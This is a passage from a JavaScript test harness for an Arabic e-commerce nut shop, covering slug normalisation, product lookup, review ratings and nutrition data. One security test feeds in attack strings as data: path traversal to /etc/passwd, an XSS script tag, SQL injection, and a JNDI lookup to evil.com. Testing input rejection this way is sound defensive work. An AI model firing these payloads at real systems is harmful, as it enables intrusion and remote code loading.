    assert.ok(csvOutput.includes('علبة مخصصة 1000جم [فستق أمريكي (محمص مملح - 50%) + كاجو جامبو (نيء - 50%)] × 1'));
  });

  // ───────────────────────────────────────────────────────────────────────────
  // SUITE 4: SLUG RESOLUTION & 404 INTEGRITY (src/lib/slugs.ts)
  // ───────────────────────────────────────────────────────────────────────────
  suite('4. Slug Resolution & Arabic Normalization (src/lib/slugs.ts)');

  await test('T5_SLUGS_01: normalizeArabicText diacritics (tashkeel) stripping', () => {
    const textWithTashkeel = 'فُسْتُقٌ أَمْرِيكِيٌّ فَوَاكِه';
    const normalized = slugs.normalizeArabicText(textWithTashkeel);
    assert.equal(normalized, 'فستق-امريكي-فواكه');
  });

  await test('T5_SLUGS_02: normalizeArabicText Alef variants unification (إ, أ, آ, ٱ -> ا)', () => {
    const text = 'إبراهيم أحمد آمنة ٱمرأة';
    const normalized = slugs.normalizeArabicText(text);
    assert.equal(normalized, 'ابراهيم-احمد-امنه-امراه');
  });

  await test('T5_SLUGS_03: normalizeArabicText Teh Marbuta (ة -> ه) and Alef Maksura (ى -> ي)', () => {
    const text = 'محمصة الواحة الذهبية على المستوى';
    const normalized = slugs.normalizeArabicText(text);
    assert.equal(normalized, 'محمصه-الواحه-الذهبيه-علي-المستوي');
  });

  await test('T5_SLUGS_04: normalizeArabicText punctuation, hyphens, and whitespace unification', () => {
    const text = '--- فستق ___ أمريكي (فاخر) ---';
    const normalized = slugs.normalizeArabicText(text);
    assert.equal(normalized, 'فستق-امريكي-فاخر');
  });

  await test('T5_SLUGS_05: resolveProductBySlug Tier 1: exact Product ID match', () => {
    const prod = slugs.resolveProductBySlug('prod-pistachio-1');
    assert.ok(prod, 'Should find product by exact ID');
    assert.equal(prod.id, 'prod-pistachio-1');
  });

  await test('T5_SLUGS_06: resolveProductBySlug Tier 2: exact ASCII slug match', () => {
    const prod = slugs.resolveProductBySlug('jumbo-pistachio-usa');
    assert.ok(prod, 'Should find product by ASCII slug');
    assert.equal(prod.id, 'prod-pistachio-1');
  });

  await test('T5_SLUGS_07: resolveProductBySlug Tier 3: normalized Arabic product name match', () => {
    const prod = slugs.resolveProductBySlug('فستق أمريكي جامبو محمص');
    assert.ok(prod, 'Should find product by Arabic name');
    assert.equal(prod.id, 'prod-pistachio-1');
  });

  await test('T5_SLUGS_08: resolveProductBySlug Tier 4: normalized slug match (case & hyphen tolerant)', () => {
    const prod = slugs.resolveProductBySlug('JUMBO_PISTACHIO_USA');
    assert.ok(prod, 'Should find product by normalized uppercase underscore slug');
    assert.equal(prod.id, 'prod-pistachio-1');
  });

  await test('T5_SLUGS_09: resolveProductBySlug Tier 5: tolerant substring match', () => {
    const prod = slugs.resolveProductBySlug('فستق أمريكي');
    assert.ok(prod, 'Should resolve by substring match of Arabic name');
    assert.equal(prod.id, 'prod-pistachio-1');
  });

  await test('T5_SLUGS_10: resolveProductBySlug URL-encoded slug resolution', () => {
    const encoded = encodeURIComponent('فستق أمريكي جامبو محمص');
    const prod = slugs.resolveProductBySlug(encoded);
    assert.ok(prod, 'Should resolve URL-encoded Arabic slug');
    assert.equal(prod.id, 'prod-pistachio-1');
  });

  await test('T5_SLUGS_11: resolveProductBySlug 404 trigger (returns undefined) for non-existent slugs', () => {
    assert.equal(slugs.resolveProductBySlug('non-existent-product-12345'), undefined);
    assert.equal(slugs.resolveProductBySlug(''), undefined);
    assert.equal(slugs.resolveProductBySlug(null), undefined);
  });

  await test('T5_SLUGS_12: resolveProductBySlug security: malicious inputs (path traversal, XSS, SQLi) return undefined', () => {
    assert.equal(slugs.resolveProductBySlug('../../etc/passwd'), undefined);
    assert.equal(slugs.resolveProductBySlug('<script>alert("xss")</script>'), undefined);
    assert.equal(slugs.resolveProductBySlug("' OR 1=1 --"), undefined);
    assert.equal(slugs.resolveProductBySlug('${jndi:ldap://evil.com/a}'), undefined);
  });

  await test('T5_SLUGS_13: getRelatedProducts returns up to limit, same category first, excludes current product', () => {
    const related = slugs.getRelatedProducts(mockPistachio, 3);
    assert.ok(Array.isArray(related));
    assert.ok(related.length <= 3);
    assert.equal(related.some(p => p.id === mockPistachio.id), false, 'Must NOT contain current product');
    assert.equal(related.every(p => p.inStock), true, 'Must only contain in-stock products');
  });

  // ───────────────────────────────────────────────────────────────────────────
  // SUITE 5: REVIEWS & NUTRITIONAL INTEGRITY (src/lib/reviews.ts & src/lib/nutrition.ts)
  // ───────────────────────────────────────────────────────────────────────────
  suite('5. Reviews & Nutrition Engines (src/lib/reviews.ts & src/lib/nutrition.ts)');

  await test('T5_REV_01: recalculateProductRating initialization on product with 0 prior reviews', () => {
    const res5 = reviews.recalculateProductRating(0, 0, 5);
    assert.equal(res5.newRating, 5);
    assert.equal(res5.newCount, 1);

    const res1 = reviews.recalculateProductRating(undefined, undefined, 1);
    assert.equal(res1.newRating, 1);
    assert.equal(res1.newCount, 1);
  });

  await test('T5_REV_02: recalculateProductRating single prior review update (5.0 + 1 -> 3.0)', () => {
    const res = reviews.recalculateProductRating(5, 1, 1);
    assert.equal(res.newCount, 2);
    // (5 * 1 + 1) / 2 = 3.0
    assert.equal(res.newRating, 3.0);
  });

  await test('T5_REV_03: recalculateProductRating multi-review weighted average with decimal rounding (3.875 -> 3.9)', () => {
    // Current: 4.5 rating with 3 reviews. Incoming: 2.
    // (4.5 * 3 + 2) / 4 = (13.5 + 2) / 4 = 15.5 / 4 = 3.875 -> rounded to 3.9
    const res = reviews.recalculateProductRating(4.5, 3, 2);
    assert.equal(res.newCount, 4);
    assert.equal(res.newRating, 3.9);
  });

  await test('T5_REV_04: recalculateProductRating extreme volume scale test (10,000 prior reviews)', () => {
    // Current: 4.8 rating with 10,000 reviews. Incoming: 1.0.
    // (4.8 * 10000 + 1) / 10001 = 48001 / 10001 = 4.7996... -> 4.8
    const resLow = reviews.recalculateProductRating(4.8, 10000, 1);
    assert.equal(resLow.newCount, 10001);
    assert.equal(resLow.newRating, 4.8);

    // Current: 4.8 rating with 10,000 reviews. Incoming: 5.0.
    // (4.8 * 10000 + 5) / 10001 = 48005 / 10001 = 4.800019... -> 4.8
    const resHigh = reviews.recalculateProductRating(4.8, 10000, 5);
    assert.equal(resHigh.newCount, 10001);
    assert.equal(resHigh.newRating, 4.8);
  });

  await test('T5_REV_05: recalculateProductRating boundary rating validation (throws on <1 or >5)', () => {
    assert.throws(() => reviews.recalculateProductRating(4, 5, 0), /التقييم يجب أن يكون/);
    assert.throws(() => reviews.recalculateProductRating(4, 5, 6), /التقييم يجب أن يكون/);
    assert.throws(() => reviews.recalculateProductRating(4, 5, NaN), /التقييم يجب أن يكون/);
    assert.throws(() => reviews.recalculateProductRating(4, 5, '5'), /التقييم يجب أن يكون/);
  });

  await test('T5_REV_06: validateReviewInput valid standard review payload', () => {
    const validBody = {
      productId: 'prod-pistachio-1',
      customerName: 'كريم عبد العزيز',
      rating: 5,
      comment: 'فستق ممتاز ومقرمش جداً وتوصيل سريع',
    };
    const res = reviews.validateReviewInput(validBody);
    assert.equal(res.isValid, true);
    assert.equal(res.sanitized.productId, 'prod-pistachio-1');
    assert.equal(res.sanitized.customerName, 'كريم عبد العزيز');
    assert.equal(res.sanitized.rating, 5);
  });

  await test('T5_REV_07: validateReviewInput customerName length boundary (< 2 characters rejected)', () => {
    // 1 char: rejected
    const res1 = reviews.validateReviewInput({
      productId: 'prod-1', customerName: 'أ', rating: 5, comment: 'تعليق جيد'
    });
    assert.equal(res1.isValid, false);
    assert.match(res1.error, /اسم العميل مطلوب ويجب أن يكون حرفين على الأقل/);

    // 2 chars: valid
    const res2 = reviews.validateReviewInput({
      productId: 'prod-1', customerName: 'مي', rating: 5, comment: 'تعليق جيد'
    });
    assert.equal(res2.isValid, true);

    // Whitespace only: rejected
    const resWs = reviews.validateReviewInput({
      productId: 'prod-1', customerName: '   ', rating: 5, comment: 'تعليق جيد'
    });
    assert.equal(resWs.isValid, false);
  });

  await test('T5_REV_08: validateReviewInput comment length boundary (< 3 characters rejected)', () => {
    // 2 chars: rejected
    const res2 = reviews.validateReviewInput({
      productId: 'prod-1', customerName: 'سامي', rating: 5, comment: 'مم'
    });
    assert.equal(res2.isValid, false);
    assert.match(res2.error, /التعليق مطلوب ويجب أن يحتوي على 3 أحرف على الأقل/);

    // 3 chars: valid
    const res3 = reviews.validateReviewInput({
      productId: 'prod-1', customerName: 'سامي', rating: 5, comment: 'رائع'
    });
    assert.equal(res3.isValid, true);
  });

  await test('T5_REV_09: validateReviewInput star rating boundary (rejects 0 and 6, accepts 1 and 5)', () => {
    assert.equal(reviews.validateReviewInput({ productId: 'p', customerName: 'علي', rating: 0, comment: 'جيد جدا' }).isValid, false);
    assert.equal(reviews.validateReviewInput({ productId: 'p', customerName: 'علي', rating: 6, comment: 'جيد جدا' }).isValid, false);
    assert.equal(reviews.validateReviewInput({ productId: 'p', customerName: 'علي', rating: 1, comment: 'جيد جدا' }).isValid, true);
    assert.equal(reviews.validateReviewInput({ productId: 'p', customerName: 'علي', rating: 5, comment: 'جيد جدا' }).isValid, true);
    assert.equal(reviews.validateReviewInput({ productId: 'p', customerName: 'علي', rating: '4', comment: 'جيد جدا' }).isValid, true);
  });

  await test('T5_REV_10: validateReviewInput productId requirement and empty object rejection', () => {
    assert.equal(reviews.validateReviewInput(null).isValid, false);
    assert.equal(reviews.validateReviewInput({}).isValid, false);
    assert.equal(reviews.validateReviewInput({ productId: '', customerName: 'علي', rating: 5, comment: 'ممتاز' }).isValid, false);
  });

  await test('T5_NUT_01: NUTRITION_DICTIONARY covers all 10 core products with valid nutritional metrics', () => {
    const dict = nutrition.NUTRITION_DICTIONARY;
    const requiredProductIds = [
      'prod-pistachio-1', 'prod-hazelnut-1', 'prod-walnut-1', 'prod-cashew-1', 'prod-almond-1',
      'prod-royal-mix-1', 'prod-energy-mix-1', 'prod-dates-stuffed-1', 'prod-apricot-prunes-1', 'prod-savory-mix-1'
    ];

    for (const pid of requiredProductIds) {
      const item = dict[pid];
      assert.ok(item, `Product ${pid} must have an entry in NUTRITION_DICTIONARY`);
      assert.ok(typeof item.servingSize === 'string' && item.servingSize.length > 0);
      assert.ok(typeof item.calories === 'number' && item.calories > 0);
      assert.ok(typeof item.protein === 'number' && item.protein > 0);
      assert.ok(Array.isArray(item.healthBenefits) && item.healthBenefits.length >= 3);
    }
  });

  await test('T5_NUT_02: getProductNutritionalInfo retrieves accurate dictionary entry by product ID', () => {
    const info = nutrition.getProductNutritionalInfo(mockPistachio);
    assert.equal(info.calories, 159);
    assert.equal(info.protein, 5.7);
    assert.equal(info.servingSize, '28 جم (حوالي 45-49 حبة)');
  });

  await test('T5_NUT_03: getProductNutritionalInfo retrieves entry by slug matching', () => {
    const prodBySlug = {
      id: 'custom-unregistered-id',
      slug: 'fresh-turkish-hazelnut-premium',
      name: 'بندق تركي',
      weights: [],
    };
    const info = nutrition.getProductNutritionalInfo(prodBySlug);
    assert.equal(info.calories, 176, 'Should match hazelnut dictionary entry via slug');
    assert.equal(info.protein, 4.2);
  });

  await test('T5_NUT_04: getProductNutritionalInfo respects explicit nutritionalInfo on product object', () => {
    const customNutInfo = {
      servingSize: '50 جم',
      calories: 300,
      protein: 12,
      fats: 20,
      carbohydrates: 15,
      fiber: 5,
      healthBenefits: ['فائدة مخصصة 1', 'فائدة مخصصة 2'],
    };
    const productWithExplicit = {
      ...mockPistachio,
      nutritionalInfo: customNutInfo,
    };
    const info = nutrition.getProductNutritionalInfo(productWithExplicit);
    assert.deepEqual(info, customNutInfo, 'Explicit nutritionalInfo must override dictionary lookup');
  });

  await test('T5_NUT_05: getProductNutritionalInfo mathematical fallback for unknown products', () => {
    const unknownProduct = {
      id: 'unknown-mystery-product',
      slug: 'mystery-snack',
      name: 'وجبة غامضة',
      caloriesPer100g: 600,
      proteinPer100g: '25',
      weights: [],
    };
    const info = nutrition.getProductNutritionalInfo(unknownProduct);
    assert.ok(info);
    // (600 * 28) / 100 = 168
    assert.equal(info.calories, 168);
    // (25 * 28) / 100 = 7.0
    assert.equal(info.protein, 7.0);
  });

  // ───────────────────────────────────────────────────────────────────────────
  // SUMMARY RESULTS
  // ───────────────────────────────────────────────────────────────────────────
  console.log(`\n${colors.bold}${colors.cyan}══════════════════════════════════════════════════════════════════════════════${colors.reset}`);
  console.log(`${colors.bold}${colors.cyan}TIER 5 ADVERSARIAL STRESS TEST SUMMARY${colors.reset}`);
  console.log(`${colors.bold}${colors.cyan}══════════════════════════════════════════════════════════════════════════════${colors.reset}`);
  console.log(`  Total Test Cases : ${totalTests}`);
  console.log(`  Passed           : ${colors.green}${passedTests}${colors.reset}`);
  console.log(`  Failed           : ${failedTests > 0 ? colors.red : colors.green}${failedTests}${colors.reset}`);
  const passRate = ((passedTests / totalTests) * 100).toFixed(1);
  console.log(`  Pass Rate        : ${passRate === '100.0' ? colors.green : colors.red}${passRate}%${colors.reset}`);

  if (failedTests > 0) {
    console.log(`\n${colors.red}${colors.bold}DEFECTS DETECTED (${failedTests}):${colors.reset}`);
    for (const f of failures) {
      console.log(`  - ${f.name}: ${f.error.message}`);
    }
    process.exit(1);
  } else {
    console.log(`\n${colors.green}${colors.bold}🎉 ALL ${totalTests} TIER 5 WHITE-BOX STRESS TESTS PASSED WITH 100% SUCCESS!${colors.reset}\n`);
    process.exit(0);
  }
}

runAllStressTests().catch((err) => {
  console.error('Fatal stress harness failure:', err);
  process.exit(1);
});
